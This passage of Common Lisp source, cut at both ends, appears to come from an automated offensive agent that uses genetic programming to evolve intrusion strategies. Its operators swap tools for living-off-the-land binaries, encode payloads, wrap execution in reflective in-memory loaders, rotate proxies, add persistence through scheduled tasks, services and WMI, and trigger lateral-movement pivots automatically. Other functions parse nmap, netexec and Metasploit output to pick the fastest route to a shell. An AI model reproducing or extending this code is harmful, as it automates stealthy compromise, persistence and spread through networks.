      ;; Operator 5: PERSISTENCE-INJECT
      ((< r 0.80)
       (inject-persistence-node expression))
      ;; Operator 6: PIVOT-AUTO
      ((< r 0.90)
       (inject-pivot-auto expression))
      ;; Operator 7: TRADITIONAL (fallback)
      (t
       (if (and terminals functions)
           (mutate-subtree expression max-depth terminals functions)
         ;; Fallback when no terminals/functions provided: apply LOLBIN-SWAP
         (apply-lolbin-swap expression max-depth terminals functions))))))

(defun has-framework-tool-p (expression)
  "Check if EXPRESSION contains any framework tool symbols.

Parameters:
  EXPRESSION — S-expression tree to scan.

Returns:
  T if any framework tool symbol is found, NIL otherwise."
  (labels ((scan (node)
             (cond
               ((atom node)
                (when (is-framework-tool-p node) (return-from has-framework-tool-p t)))
               ((consp node)
                (dolist (child (cdr node))
                  (scan child))))))
    (scan expression)
    nil))

(defun apply-lolbin-swap (expression max-depth terminals functions)
  "Apply the LOLBIN-SWAP mutation: replace framework tool with LOLBin equivalent.

Selects a random framework tool in the expression and replaces it with
the first (quietest) LOLBin equivalent from *LOLBIN-MAPPING*.  If no
framework tools are found, falls back to traditional mutation.

Parameters:
  EXPRESSION, MAX-DEPTH, TERMINALS, FUNCTIONS — As per MUTATE-SUBTREE-TTS-OPTIMIZED.

Returns:
  Mutated S-expression with framework tool replaced by LOLBin."
  (declare (ignore max-depth))
  ;; Find all framework tools and their addresses
  (let ((framework-nodes '()))
    (labels ((collect (addr node)
               (cond
                 ((atom node)
                  (when (is-framework-tool-p node)
                    (push (cons addr node) framework-nodes)))
                 ((consp node)
                  (loop for child in (cdr node)
                        for i from 0
                        do (collect (append addr (list i)) child))))))
      (collect '() expression)
      (if framework-nodes
          ;; Pick a random framework tool and swap it
          (let* ((choice (nth (random (length framework-nodes)) framework-nodes))
                 (addr (car choice))
                 (old-tool (cdr choice))
                 (lolbin-alt (lolbin-equivalent old-tool)))
            (if lolbin-alt
                (replace-subtree expression (car lolbin-alt) addr)
              ;; No LOLBin equivalent — try traditional mutation
              (if (and terminals functions)
                  (mutate-subtree expression (1+ (random *max-gp-tree-depth*))
                                  terminals functions)
                expression)))
        ;; No framework tools found — return original or traditional mutate
        (if (and terminals functions)
            (mutate-subtree expression (1+ (random *max-gp-tree-depth*))
                            terminals functions)
          expression)))))

(defun apply-encode-payload (expression max-depth terminals functions)
  "Apply the ENCODE-PAYLOAD mutation: wrap in base64/XOR encoding.

Finds a payload-related node and wraps it in (base64-encode ...) or
(xor-encode ...).  If no clear payload node is found, wraps the entire
expression.

Parameters:
  EXPRESSION, MAX-DEPTH, TERMINALS, FUNCTIONS — As per MUTATE-SUBTREE-TTS-OPTIMIZED.

Returns:
  Mutated S-expression with encoding wrapper applied."
  (declare (ignore max-depth terminals functions))
  (let ((payload-indicators '(powershell powershell.exe cmd.exe cmd.exe
                              certutil.exe mshta.exe payload
                              shellcode exploit-payload delivery-payload))
        (found nil)
        (found-addr nil))
    ;; Find a payload-related node
    (labels ((collect (addr node)
               (when found (return-from collect nil))
               (cond
                 ((atom node)
                  (when (member node payload-indicators :test #'symbol-match)
                    (setf found node
                          found-addr addr)))
                 ((consp node)
                  (loop for child in (cdr node)
                        for i from 0
                        do (collect (append addr (list i)) child))))))
      (collect '() expression)
      (if found
          ;; Wrap the found payload node in encoding
          (replace-subtree expression
                           `(,(if (zerop (random 2)) 'base64-encode 'xor-encode)
                             ,(replace-subtree expression 'placeholder found-addr))
                           found-addr)
        ;; No payload found — wrap the root
        `(,(if (zerop (random 2)) 'base64-encode 'xor-encode)
          ,expression)))))

(defun apply-reflective-wrap (expression max-depth terminals functions)
  "Apply the REFLECTIVE-WRAP mutation: wrap execution in reflective loader.

Finds an execution-related node and wraps it in (reflective-load ...).
This avoids disk writes by loading the payload directly into memory.

Parameters:
  EXPRESSION, MAX-DEPTH, TERMINALS, FUNCTIONS — As per MUTATE-SUBTREE-TTS-OPTIMIZED.

Returns:
  Mutated S-expression with reflective loader wrapper."
  (declare (ignore max-depth terminals functions))
  (let ((exec-indicators '(execute run exec invoke load-library
                           load-assembly drop-and-run spawn))
        (found nil)
        (found-addr nil))
    ;; Find an execution node
    (labels ((collect (addr node)
               (when found (return-from collect nil))
               (cond
                 ((atom node)
                  (when (member node exec-indicators :test #'symbol-match)
                    (setf found node
                          found-addr addr)))
                 ((consp node)
                  (loop for child in (cdr node)
                        for i from 0
                        do (collect (append addr (list i)) child))))))
      (collect '() expression)
      (if found
          (replace-subtree expression `(reflective-load ,found) found-addr)
        ;; No execution node found — wrap root
        `(reflective-load ,expression)))))

(defun apply-proxy-chain (expression max-depth terminals functions)
  "Apply the PROXY-CHAIN mutation: add proxy rotation to network connections.

Finds a network-related node and wraps it in (proxy-rotate ...).

Parameters:
  EXPRESSION, MAX-DEPth, TERMINALS, FUNCTIONS — As per MUTATE-SUBTREE-TTS-OPTIMIZED.

Returns:
  Mutated S-expression with proxy rotation wrapper."
  (declare (ignore max-depth terminals functions))
  (let ((net-indicators '(connect http-get smb-connect ssh-connect
                          download upload curl wget nc netcat))
        (found nil)
        (found-addr nil))
    ;; Find a network node
    (labels ((collect (addr node)
               (when found (return-from collect nil))
               (cond
                 ((atom node)
                  (when (member node net-indicators :test #'symbol-match)
                    (setf found node
                          found-addr addr)))
                 ((consp node)
                  (loop for child in (cdr node)
                        for i from 0
                        do (collect (append addr (list i)) child))))))
      (collect '() expression)
      (if found
          (replace-subtree expression `(proxy-rotate ,found) found-addr)
        ;; No network node found — wrap root
        `(proxy-rotate ,expression)))))

(defun inject-persistence-node (expression)
  "Inject a persistence mechanism into an exploit flow.

Wraps the expression in a PROGN that adds persistence after the main
operation.  The persistence technique is selected based on the expression's
content — if it already targets Windows, registry-based persistence is
preferred.

Parameters:
  EXPRESSION — S-expression to augment with persistence.

Returns:
  New S-expression with persistence injected."
  (let ((persistence-techniques
         '((progn (registry-runkey-add) (sleep 5))
           (schtasks /create /tn update /tr payload /sc onlogon)
           (wmic process call create persist-command)
           (sc create persist-service binpath= payload start= auto))))
    ;; Select a random persistence technique
    `(progn
       ,expression
       ,(nth (random (length persistence-techniques)) persistence-techniques))))

(defun inject-pivot-auto (expression)
  "Add automatic pivot spawn on successful compromise.

Wraps the expression in a conditional that spawns a pivot when the
primary operation succeeds.  This is useful for multi-target engagements
where lateral movement is needed.

Parameters:
  EXPRESSION — S-expression to augment with pivot logic.

Returns:
  New S-expression with automatic pivot on success."
  `(if (successful-p ,expression)
       (progn
         ,expression
         (pivot-lateral-movement (get-new-targets)))
     ,expression))

(defun successful-p (result)
  "Check if RESULT indicates a successful operation.

Helper predicate used by INJECT-PIVOT-AUTO to determine if the primary
operation succeeded.  Various result types are checked:
  • Non-NIL return (general Lisp truthiness)
  • :SUCCESS keyword
  • :COMPROMISED keyword
  • Non-empty list
  • Number > 0

Parameters:
  RESULT — Any Lisp value.

Returns:
  T if the result indicates success, NIL otherwise."
  (cond
    ((null result) nil)
    ((and (symbolp result) (member result '(:success :compromised :pwned
                                             :shell-obtained :done)
                                   :test #'eq))
     t)
    ((and (numberp result) (> result 0)) t)
    ((and (listp result) (not (null result))) t)
    (t t)))  ;; Default: non-nil is success


;; ═══════════════════════════════════════════════════════════════════════════
;; SECTION E: Framework Avoidance Logic
;; ═══════════════════════════════════════════════════════════════════════════

(defun should-use-lolbin-p (target-info available-lolbins)
  "Decide whether to use a LOLBin instead of a framework.

This is the core decision function for framework avoidance.  It evaluates
the operational context and returns T if a LOLBin should be preferred.

ALWAYS USE LOLBIN WHEN:
  • Noise budget is :SILENT or :LOW — stealth is paramount
  • Target has Windows (most LOLBins are Windows-native)
  • Evasion score target is > 80 (high evasion requirement)
  • Available LOLBins > 0 (there's at least one option)

USE FRAMEWORK WHEN:
  • Post-exploitation modules are specifically needed (meterpreter migrate,
    hashdump, screenshot, keylogging)
  • Target requires complex multi-stage exploit (ROP chain, infoleak + exploit)
  • Framework provides unique capability not available via LOLBin
  • Target is non-Windows (Linux/macOS have fewer LOLBin options)

The decision is a weighted vote across these factors.  If the LOLBin
score exceeds the framework score, T is returned.

Parameters:
  TARGET-INFO      — Plist describing target: (:os :windows/:linux/:macos,
                      :version, :domain-joined t/nil, :powershell t/nil).
  AVAILABLE-LOLBINS — List of LOLBin symbols available in the environment.

Returns:
  T if LOLBin should be preferred, NIL if framework is justified.

Example:
  (should-use-lolbin-p
    '(:os :windows :domain-joined t :powershell t)
    '(psexec.py wmiexec.py certutil.exe powershell.exe))
    => T    ; Windows target with multiple LOLBins available"
  (let ((lolbin-score 0)
        (framework-score 0))
    ;; Factor 1: Noise budget
    (let ((noise-budget (getf target-info :noise-budget :medium)))
      (case noise-budget
        (:silent (incf lolbin-score 3))
        (:low    (incf lolbin-score 2))
        (:medium (incf lolbin-score 1))
        (:high   (incf framework-score 1))))
    ;; Factor 2: Target OS
    (let ((os (getf target-info :os :unknown)))
      (case os
        (:windows      (incf lolbin-score 2))
        (:windows-10   (incf lolbin-score 2))
        (:windows-11   (incf lolbin-score 2))
        (:windows-server (incf lolbin-score 2))
        (:linux        (incf framework-score 1))
        (:macos        (incf framework-score 1))
        (otherwise     (incf lolbin-score 1))))
    ;; Factor 3: Evasion requirement
    (let ((evasion-target (getf target-info :evasion-target 50)))
      (if (> evasion-target 80)
          (incf lolbin-score 2)
        (if (> evasion-target 50)
            (incf lolbin-score 1)
          (incf framework-score 1))))
    ;; Factor 4: LOLBin availability
    (if (and (listp available-lolbins) (> (length available-lolbins) 0))
        (incf lolbin-score (min 2 (length available-lolbins)))
      (incf framework-score 2))
    ;; Factor 5: Post-exploitation need
    (when (getf target-info :needs-post-exploitation nil)
      (incf framework-score 2))
    ;; Factor 6: Complex multi-stage exploit
    (when (getf target-info :needs-multistage nil)
      (incf framework-score 1))
    ;; Factor 7: PowerShell available (major LOLBin enabler)
    (when (getf target-info :powershell nil)
      (incf lolbin-score 1))
    ;; Decision
    (>= lolbin-score framework-score)))

(defun auto-select-tool-type (target-info noise-budget)
  "Auto-select tool type: LOLBin preferred, framework fallback.

Convenience wrapper around SHOULD-USE-LOLBIN-P that derives the available
LOLBins list from the target info and noise budget.

Parameters:
  TARGET-INFO  — Plist describing the target environment.
  NOISE-BUDGET — Keyword: :SILENT, :LOW, :MEDIUM, or :HIGH.

Returns:
  :LOLBIN if LOLBin should be used, :FRAMEWORK if framework is justified.

Example:
  (auto-select-tool-type '(:os :windows :powershell t) :low)
    => :LOLBIN"
  (let* ((os (getf target-info :os :unknown))
         (available-lolbins
          (case os
            ((:windows :windows-10 :windows-11 :windows-server)
             '(certutil.exe mshta.exe rundll32.exe regsvr32.exe
               powershell.exe wmic.exe schtasks.exe
               psexec.py wmiexec.py smbexec.py))
            (:linux
             '(ssh bash python perl ruby awk sed cron))
            (:macos
             '(osascript ssh python bash launchctl))
            (otherwise
             '(python bash ssh)))))
    (if (should-use-lolbin-p (append target-info (list :noise-budget noise-budget))
                             available-lolbins)
        :lolbin
      :framework)))

(defun penalize-framework-usage (chromosome)
  "Apply fitness penalty when a framework is used where LOLBin would work.

This is a convenience function that combines LOLBIN-MISS-PENALTY with a
simplified interface.  It scans the chromosome's expression for framework
tools that have LOLBin equivalents and returns the penalty.

Parameters:
  CHROMOSOME — STRATEGY-CHROMOSOME struct to penalize.

Returns:
  Float: 0.0 or *PENALTY-LOLBIN-MISS* (0.10)."
  (let ((expr (strategy-chromosome-expression chromosome)))
    (labels ((scan (node)
               (cond
                 ((atom node)
                  (when (and (is-framework-tool-p node)
                             (lolbin-equivalent node))
                    (return-from penalize-framework-usage *penalty-lolbin-miss*)))
                 ((consp node)
                  (dolist (child (cdr node))
                    (scan child))))))
      (scan expr)
      0.0)))


;; ═══════════════════════════════════════════════════════════════════════════
;; SECTION F: Tool Output Analysis for Fastest Path Identification
;; ═══════════════════════════════════════════════════════════════════════════

(defun analyze-nmap-for-fastest-path (nmap-output)
  "Parse nmap output and identify the fastest exploitation path.

Given raw nmap output (as a string or parsed list), this function
identifies the service most likely to yield a quick shell based on:
  1. Service name and version (known-exploit services prioritized)
  2. Port number (common exploit ports scored higher)
  3. Service banner (indicators of weak/default configuration)

Returns a plist:
  (:SERVICE <name> :PORT <n> :CONFIDENCE 0.0-1.0 :SUGGESTED-TOOL <name>)

The confidence score reflects how likely this path is to succeed quickly:
  1.0 — Known vulnerable version with public exploit (MS17-010, etc.)
  0.8 — Service with common credential reuse (SMB, SSH with defaults)
  0.6 — Service with known weak configuration
  0.4 — Service that might be exploitable (further analysis needed)
  0.2 — No clear path, try brute force or social engineering

Parameters:
  NMAP-OUTPUT — String or list containing nmap scan results.

Returns:
  Plist with :SERVICE, :PORT, :CONFIDENCE, and :SUGGESTED-TOOL keys.

Example:
  (analyze-nmap-for-fastest-path
    \"445/tcp open  microsoft-ds Microsoft Windows Server 2016\")
    => (:SERVICE MS-SMB :PORT 445 :CONFIDENCE 0.9 :SUGGESTED-TOOL PSEXEC.PY)"
  (let* ((text (if (stringp nmap-output) nmap-output (princ-to-string nmap-output)))
         ;; Known fast-exploit services with their typical ports and tools
         (fast-services
          '(("microsoft-ds" . (:service :ms-smb :port 445 :confidence 0.9
                              :tool psexec.py))
            ("msrpc" . (:service :msrpc :port 135 :confidence 0.7
                        :tool wmiexec.py))
            ("netbios-ssn" . (:service :netbios :port 139 :confidence 0.6
                              :tool smbclient))
            ("microsoft-ds.*2008" . (:service :ms-smb-old :port 445 :confidence 1.0
                                      :tool eternalblue-check))
            ("ssh" . (:service :ssh :port 22 :confidence 0.7
                      :tool ssh-brute))
            ("ftp" . (:service :ftp :port 21 :confidence 0.6
                      :tool ftp-anon))
            ("telnet" . (:service :telnet :port 23 :confidence 0.8
                         :tool telnet-login))
            ("http" . (:service :http :port 80 :confidence 0.5
                      :tool http-exploit-scan))
            ("https" . (:service :https :port 443 :confidence 0.5
                       :tool https-exploit-scan))
            ("ms-sql-s" . (:service :mssql :port 1433 :confidence 0.8
                           :tool mssql-brute))
            ("postgresql" . (:service :postgres :port 5432 :confidence 0.6
                             :tool postgres-brute))
            ("mysql" . (:service :mysql :port 3306 :confidence 0.6
                        :tool mysql-brute))
            ("rdp" . (:service :rdp :port 3389 :confidence 0.7
                      :tool rdp-brute))
            ("winrm" . (:service :winrm :port 5985 :confidence 0.85
                        :tool evil-winrm))
            ("ldap" . (:service :ldap :port 389 :confidence 0.5
                       :tool ldap-search))
            ("snmp" . (:service :snmp :port 161 :confidence 0.6
                       :tool onesixtyone))
            ("redis" . (:service :redis :port 6379 :confidence 0.7
                        :tool redis-exploit))))
         (best-match nil)
         (best-confidence 0.0))
    ;; Search for known services in the nmap output
    (dolist (svc-entry fast-services)
      (let ((pattern (car svc-entry))
            (info (cdr svc-entry)))
        (when (search pattern text :test #'char-equal)
          (let ((conf (getf info :confidence 0.5)))
            (when (> conf best-confidence)
              (setf best-match info
                    best-confidence conf))))))
    ;; Return result or default
    (if best-match
        (list :service (getf best-match :service :unknown)
              :port (getf best-match :port 0)
              :confidence best-confidence
              :suggested-tool (getf best-match :tool :unknown))
      ;; Default: no known fast path found
      (list :service :unknown
            :port 0
            :confidence 0.2
            :suggested-tool :recon-more))))

(defun analyze-netexec-for-credentials (netexec-output)
  "Parse netexec output for credential opportunities.

Netexec (the successor to CrackMapExec) output often contains:
  • SMB signing disabled
  • Guest access enabled
  • NULL session allowed
  • Password policy information
  • Cached credentials
  • Kerberos pre-auth disabled (AS-REP roastable)

This function extracts credential opportunities and returns a ranked list.

Parameters:
  NETEXEC-OUTPUT — String or list containing netexec scan results.

Returns:
  List of plists, each representing a credential opportunity:
  ((:TYPE :null-session :TARGET host :CONFIDENCE 0.9)
   (:TYPE :guest-access :TARGET host :CONFIDENCE 0.8)
   (:TYPE :smb-signing-disabled :TARGET host :CONFIDENCE 0.7))

Opportunities are sorted by confidence (highest first)."
  (let* ((text (if (stringp netexec-output) netexec-output (princ-to-string netexec-output)))
         (opportunities '()))
    ;; Check for NULL session
    (when (or (search "null session" text :test #'char-equal)
              (search "NULL SESSION" text :test #'char-equal)
              (search "[+].*SIGNING.*DISABLED" text))
      (push (list :type :null-session
                  :target (extract-target-host text)
                  :confidence 0.9)
            opportunities))
    ;; Check for Guest access
    (when (or (search "guest" text :test #'char-equal)
              (search "GUEST" text :test #'char-equal))
      (push (list :type :guest-access
                  :target (extract-target-host text)
                  :confidence 0.8)
            opportunities))
    ;; Check for SMB signing disabled
    (when (or (search "signing:False" text :test #'char-equal)
              (search "signing disabled" text :test #'char-equal))
      (push (list :type :smb-signing-disabled
                  :target (extract-target-host text)
                  :confidence 0.7)
            opportunities))
    ;; Check for Kerberos pre-auth disabled (AS-REP roastable)
    (when (or (search "Pre-Auth" text :test #'char-equal)
              (search "AS-REP" text :test #'char-equal)
              (search "DONT_REQ_PREAUTH" text))
      (push (list :type :asrep-roastable
                  :target (extract-target-host text)
                  :confidence 0.85)
            opportunities))
    ;; Check for password policy
    (when (search "Password Complexity" text :test #'char-equal)
      (push (list :type :password-policy
                  :target (extract-target-host text)
                  :confidence 0.5)
            opportunities))
    ;; Sort by confidence descending
    (sort opportunities #'> :key (lambda (o) (getf o :confidence 0.0)))))

(defun extract-target-host (text)
  "Extract the target hostname or IP from tool output text.

Simple heuristic: look for patterns like 'target:', 'host:', or IP addresses.

Parameters:
  TEXT — String containing tool output.

Returns:
  String hostname/IP, or :UNKNOWN if not found."
  ;; Try to find IP address pattern
  (let ((ip-match
         (do* ((start 0 (1+ start))
               (len (length text)))
              ((>= start len) nil)
           (when (and (< start (- len 6))
                      (digit-char-p (char text start)))
             (let ((end (min (+ start 15) len)))
               (return (subseq text start end)))))))
    (or ip-match :unknown)))

(defun analyze-metasploit-for-exploit-chain (msf-output)
  "Parse metasploit output and extract the exploit chain.

Given Metasploit console output, this function extracts:
  • Which exploit modules were used
  • Their success/failure status
  • The payload that was delivered
  • Any post-exploitation modules run
  • Session information

Parameters:
  MSF-OUTPUT — String containing Metasploit console output.

Returns:
  Plist describing the exploit chain:
  (:EXPLOIT exploit-name :PAYLOAD payload-name :SUCCESS t/nil
   :SESSIONS n :POST-MODULES (list) :TTS estimated-seconds)"
  (let* ((text (if (stringp msf-output) msf-output (princ-to-string msf-output)))
         (exploit nil)
         (payload nil)
         (success nil)
         (sessions 0)
         (post-modules '())
         (tts-estimate 0.0))
    ;; Extract exploit module
    (let ((pos (search "Exploit:" text :test #'char-equal)))
      (when pos
        (let ((end (position #\newline text :start pos)))
          (setf exploit (string-trim " " (subseq text (+ pos 8) end))))))
    ;; Extract payload
    (let ((pos (search "Payload:" text :test #'char-equal)))
      (when pos
        (let ((end (position #\newline text :start pos)))
          (setf payload (string-trim " " (subseq text (+ pos 8) end))))))
    ;; Check for success indicators
    (setf success (or (search "Meterpreter session" text :test #'char-equal)
                      (search "Command shell session" text :test #'char-equal)
                      (search "Session " text :test #'char-equal)))
    ;; Count sessions
    (let ((count 0)
          (start 0))
      (loop
        (let ((pos (search "session" text :start2 start :test #'char-equal)))
          (unless pos (return))
          (incf count)
          (setf start (+ pos 7))))
      (setf sessions count))
    ;; Estimate TTS from output timestamps if available
    (let ((start-pos (search "Started" text :test #'char-equal))
          (end-pos (search "session" text :test #'char-equal)))
      (when (and start-pos end-pos (> end-pos start-pos))
        ;; Rough heuristic: if both markers found, estimate 15-60s
        (setf tts-estimate 30.0)))
    ;; Return exploit chain summary
    (list :exploit (or exploit :unknown)
          :payload (or payload :unknown)
          :success (if success t nil)
          :sessions sessions
          :post-modules post-modules
          :tts tts-estimate)))

(defun identify-fastest-exploit-path (discovery-data)
  "Given all discovery data, identify the single fastest path to shell.

DISCOVERY-DATA is a plist aggregating all reconnaissance results:
  (:NMAP nmap-result :NETEXEC netexec-result :MSF msf-result
   :TARGET target-info :NOISE-BUDGET budget)

This function synthesizes all available intelligence and returns the
recommended exploitation path with estimated TTS and confidence.

DECISION LOGIC:
  1. If netexec found NULL sessions or Guest access → SMB credential
     path (estimated TTS: 5-15s, confidence: 0.9)
  2. If nmap found SMB on Windows with old version → exploit check
     path (estimated TTS: 10-30s, confidence: 0.8)
  3. If nmap found WinRM → Evil-WinRM path
     (estimated TTS: 8-20s, confidence: 0.85)
  4. If nmap found SSH/FTP/Telnet → brute-force credential path
     (estimated TTS: 30-120s, confidence: 0.5)
  5. Otherwise → :RECON-MORE needed

Parameters:
  DISCOVERY-DATA — Plist containing all reconnaissance results.

Returns:
  Plist: (:PATH keyword :ESTIMATED-TTS seconds :CONFIDENCE 0.0-1.0
          :TOOLS (list) :REASON string)

Example:
  (identify-fastest-exploit-path
    '(:NMAP \"445/tcp open microsoft-ds\"
      :NETEXEC \"SMB signing:False, Guest:Enabled\"
      :NOISE-BUDGET :low))
    => (:PATH :smb-credential-reuse :ESTIMATED-TTS 8.0 :CONFIDENCE 0.9
        :TOOLS (PSEXEC.PY SMBCLIENT) :REASON \"NULL session + SMB signing disabled\")"
  (let* ((nmap-result (getf discovery-data :nmap nil))
         (netexec-result (getf discovery-data :netexec nil))
         (msf-result (getf discovery-data :msf nil))
         (target-info (getf discovery-data :target nil))
         (noise-budget (getf discovery-data :noise-budget :medium))
         (nmap-path (when nmap-result
                      (analyze-nmap-for-fastest-path nmap-result)))
         (netexec-creds (when netexec-result
                          (analyze-netexec-for-credentials netexec-result)))
         (msf-chain (when msf-result
                      (analyze-metasploit-for-exploit-chain msf-result)))
         ;; Check for highest-confidence paths first
         (has-null-session (and netexec-creds
                                (member :null-session netexec-creds
                                        :key (lambda (x) (getf x :type))
                                        :test #'eq)))
         (has-guest-access (and netexec-creds
                                (member :guest-access netexec-creds
                                        :key (lambda (x) (getf x :type))
                                        :test #'eq)))
         (has-asrep-roast (and netexec-creds
                               (member :asrep-roastable netexec-creds
                                       :key (lambda (x) (getf x :type))
                                       :test #'eq)))
         (smb-service (and nmap-path
                           (eq (getf nmap-path :service) :ms-smb)))
         (winrm-service (and nmap-path
                             (eq (getf nmap-path :service) :winrm))))
    ;; Priority 1: NULL session or Guest access on SMB (fastest path)
    (if (and has-null-session smb-service)
        (list :path :smb-null-session
              :estimated-tts 5.0
              :confidence 0.95
              :tools '(smbclient rpcclient psexec.py)
              :reason "NULL SMB session allows immediate lateral movement")
      ;; Priority 2: Guest access on SMB
      (if (and has-guest-access smb-service)
          (list :path :smb-guest-access
                :estimated-tts 8.0
                :confidence 0.90
                :tools '(smbclient psexec.py wmiexec.py)
                :reason "Guest-enabled SMB allows unauthenticated file/execution access")
        ;; Priority 3: WinRM available (modern Windows management)
        (if winrm-service
            (list :path :winrm-exploit
                  :estimated-tts 10.0
                  :confidence 0.85
                  :tools '(evil-winrm wmiexec.py)
                  :reason "WinRM on modern Windows — PowerShell remoting path")
          ;; Priority 4: AS-REP roastable accounts
          (if has-asrep-roast
              (list :path :asrep-roast
                    :estimated-tts 15.0
                    :confidence 0.80
                    :tools '(GetNPUsers.py hashcat)
                    :reason "Kerberos pre-auth disabled — AS-REP roasting possible")
            ;; Priority 5: Best nmap service path
            (if (and nmap-path (> (getf nmap-path :confidence 0.0) 0.6))
                (list :path (getf nmap-path :service :unknown)
                      :estimated-tts (case (getf nmap-path :service)
                                       (:ms-smb 15.0)
                                       (:ssh 30.0)
                                       (:rdp 20.0)
                                       (:mssql 25.0)
                                       (:redis 15.0)
                                       (:winrm 10.0)
                                       (otherwise 45.0))
                      :confidence (getf nmap-path :confidence 0.5)
                      :tools (list (getf nmap-path :suggested-tool :unknown))
                      :reason "Nmap-identified service with known exploitation path")
              ;; Priority 6: Metasploit chain if available
              (if (and msf-chain (getf msf-chain :success))
                  (list :path :msf-repeat
                        :estimated-tts (getf msf-chain :tts 30.0)
                        :confidence 0.70
                        :tools '(msfconsole)
                        :reason "Previous Metasploit success — repeat with same chain")
                ;; Fallback: need more reconnaissance
                (list :path :recon-more
                      :estimated-tts 999.0
                      :confidence 0.1
                      :tools '(nmap netexec)
                      :reason "Insufficient intelligence — expand reconnaissance scope"))))))))


;; ═══════════════════════════════════════════════════════════════════════════
;; SECTION G: TTS-Optimized Evolution Cycle
;; ═══════════════════════════════════════════════════════════════════════════

(defun run-evolutionary-cycle-tts (agent &key (generations 5) (population-size 20))
  "TTS-optimized evolution cycle for offensive strategy evolution.

This is the v2.4 replacement for RUN-EVOLUTIONARY-CYCLE.  It uses the
TTS-FITNESS function instead of the generic STRATEGY-FITNESS, and applies
LOLBIN-aware mutation operators throughout the evolutionary process.

PROCESS:
  1. Generate initial population with LOLBin bias (seed + LOLBin mutations).
  2. Evaluate fitness using TTS-FITNESS (not generic fitness).
  3. Select parents via tournament, favoring low-TTS + high evasion.
  4. Crossover with LOLBin-aware subtree operators.
  5. Mutate with TTS-optimized operators (LOLBIN-SWAP, ENCODE-PAYLOAD, etc.).
  6. Return fittest strategy (lowest TTS, highest evasion score).

LOLBIN BIAS IN INITIALIZATION:
  The initial population is seeded with variants that have had LOLBIN-SWAP
  applied to framework tools.  This biases the starting population toward
  stealthier strategies before evolution even begins.

Parameters:
  AGENT          — The agent to evolve (must have :fitness-data in state).
  GENERATIONS    — Number of evolutionary iterations (default 5).
  POPULATION-SIZE — Number of chromosomes per generation (default 20).

Returns:
  Compiled function (the fittest evolved strategy), or NIL if evolution
  was not triggered.

Example:
  (run-evolutionary-cycle-tts my-agent :generations 7 :population-size 30)
    => #<FUNCTION (LAMBDA (AGENT)) {0x...}>"
  (bt:with-lock-held ((agent-lock agent))
    (unless (should-evolve-p agent)
      (return-from run-evolutionary-cycle-tts nil))
    ;; Record evolution start
    (setf (gethash :last-evolution-time (agent-state agent)) (local-time:now))
    (setf (gethash :evolution-generation (agent-state agent)) 0)
    (setf (gethash :evolution-mode (agent-state agent)) :tts-optimized)
    ;; Build seed chromosome
    (let* ((current-strategy (agent-strategy agent))
           (seed-expression (or (gethash :strategy-expression (agent-state agent))
                                (decompile-strategy current-strategy agent)))
           (seed-chromosome (make-strategy-chromosome
                             :expression seed-expression
                             :fitness 0.0
                             :generation 0))
           ;; Derive fitness data (TTS-specific format)
           (fitness-data (or (gethash :fitness-data (agent-state agent))
                             (generate-default-tts-fitness-data agent)))
           ;; Extract terminal and function sets
           (terminals (append *default-gp-terminals*
                              *lolbin-terminals*
                              (extract-terminals seed-expression)))
           (functions *default-gp-functions*)
           ;; Run TTS-optimized evolution
           (fittest (evolve-strategy-tts seed-chromosome fitness-data
                                          terminals functions
                                          :generations generations
                                          :population-size population-size)))
      ;; Log the evolution
      (log-evolution agent seed-chromosome fittest)
      ;; Store evolved expression
      (setf (gethash :strategy-expression (agent-state agent))
            (strategy-chromosome-expression fittest))
      ;; Store generation stats
      (setf (gethash :evolution-generation (agent-state agent))
            (strategy-chromosome-generation fittest))
      ;; Store TTS metadata
      (setf (gethash :evolution-tts-score (agent-state agent))
            (strategy-chromosome-fitness fittest))
      ;; Compile and return
      (compile-chromosome fittest))))

(defun evolve-strategy-tts (current-chromosome fitness-data terminals functions
                              &key (generations 5) (population-size 20))
  "TTS-optimized genetic programming engine.

This is the TTS replacement for EVOLVE-STRATEGY.  It runs the full GP
pipeline with TTS-fitness evaluation and LOLBin-aware operators.

KEY DIFFERENCES FROM EVOLVE-STRATEGY:
  • Uses TTS-FITNESS instead of STRATEGY-FITNESS.
  • Initial population has LOLBin bias (framework tools swapped to LOLBins).
  • Mutation uses MUTATE-SUBTREE-TTS-OPTIMIZED (7 specialized operators).
  • Next generation uses TTS-NEXT-GENERATION (LOLBIN-SWAP in crossover).
  • Tracks TTS-specific stats (best-TTS, avg-TTS, evasion-score).

Parameters:
  CURRENT-CHROMOSOME — Seed chromosome (generation 0).
  FITNESS-DATA       — Alist of TTS test cases.
  TERMINALS          — Terminal set (includes *LOLBIN-TERMINALS*).
  FUNCTIONS          — Function set.
  GENERATIONS        — Number of GP iterations (default 5).
  POPULATION-SIZE    — Chromosomes per generation (default 20).

Returns:
  STRATEGY-CHROMOSOME — The fittest chromosome from the final generation."
  (let* ((seed-expr (strategy-chromosome-expression current-chromosome))
         (seed-id (strategy-chromosome-id current-chromosome))
         ;; Initialize with LOLBin bias
         (population (initialize-population-tts current-chromosome
                                                population-size
                                                terminals
                                                functions))
         (best-ever current-chromosome)
         (generation-stats '()))
    ;; ── Evolutionary loop ──
    (loop for gen from 1 to generations
          do (format *trace-output*
                     "~&[EVOLVE-TTS] === Generation ~A/~A ===~%"
                     gen generations)
          ;; Step 1: Evaluate fitness using TTS-FITNESS
          (evaluate-population-tts population fitness-data)
          ;; Step 2: Find best of this generation
          (let ((gen-best (fittest-chromosome population)))
            (when (> (strategy-chromosome-fitness gen-best)
                     (strategy-chromosome-fitness best-ever))
              (setf best-ever gen-best))
            (push (list :generation gen
                        :best-fitness (strategy-chromosome-fitness gen-best)
                        :avg-fitness (average-fitness population)
                        :best-size (tree-size (strategy-chromosome-expression
                                              gen-best))
                        :best-tts (estimate-tts-from-chromosome gen-best)
                        :evasion-score (calculate-evasion-bonus gen-best))
                  generation-stats)
            (format *trace-output*
                    "~&[EVOLVE-TTS]   Best fitness: ~,3F | Avg: ~,3F | Best TTS: ~,1Fs | Evasion: ~,2F~%"
                    (strategy-chromosome-fitness gen-best)
                    (average-fitness population)
                    (estimate-tts-from-chromosome gen-best)
                    (calculate-evasion-bonus gen-best)))
          ;; Step 3: Create next generation (unless last)
          (when (< gen generations)
            (setf population
                  (next-generation-tts population terminals functions
                                        population-size gen))))
    ;; Return the fittest chromosome ever seen
    (format *trace-output*
            "~&[EVOLVE-TTS] Evolution complete. Best fitness: ~,3F | Best TTS: ~,1Fs~%"
            (strategy-chromosome-fitness best-ever)
            (estimate-tts-from-chromosome best-ever))
    best-ever))

(defun initialize-population-tts (seed-chromosome population-size terminals functions)
  "Create initial population with LOLBin bias.

Same as INITIALIZE-POPULATION but applies LOLBIN-SWAP mutation to the
